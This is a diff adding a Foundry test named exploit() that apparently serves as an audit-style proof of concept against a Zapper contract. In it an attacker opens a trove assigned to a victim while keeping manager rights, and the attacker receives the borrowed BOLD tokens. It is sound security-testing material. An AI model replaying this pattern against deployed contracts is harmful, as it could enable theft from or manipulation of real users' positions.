@@ -1,0 +1,25 @@
+function exploit() public {
+    address attacker = makeAddr("attacker");
+    address victim = makeAddr("victim");
+    IZapper zapper = baseZapperArray[1];
+    IERC20 collToken = contractsArray[1].collToken;
+
+    deal(address(collToken), attacker, 100 ether);
+    vm.deal(attacker, ETH_GAS_COMPENSATION);
+
+    vm.startPrank(attacker);
+    collToken.approve(address(zapper), 100 ether);
+
+    IZapper.OpenTroveParams memory params = IZapper.OpenTroveParams({
+        owner: victim, ownerIndex: 0,
+        collAmount: 100 ether, boldAmount: 10_000e18,
+        annualInterestRate: MIN_ANNUAL_INTEREST_RATE,
+        addManager: attacker, removeManager: attacker, receiver: address(zapper)
+    });
+
+    uint256 troveId = zapper.openTroveWithRawETH{value: ETH_GAS_COMPENSATION}(params);
+    vm.stopPrank();
+
+    assertEq(contractsArray[1].troveNFT.ownerOf(troveId), victim);
+    assertEq(boldToken.balanceOf(attacker), 10_000e18);
+}
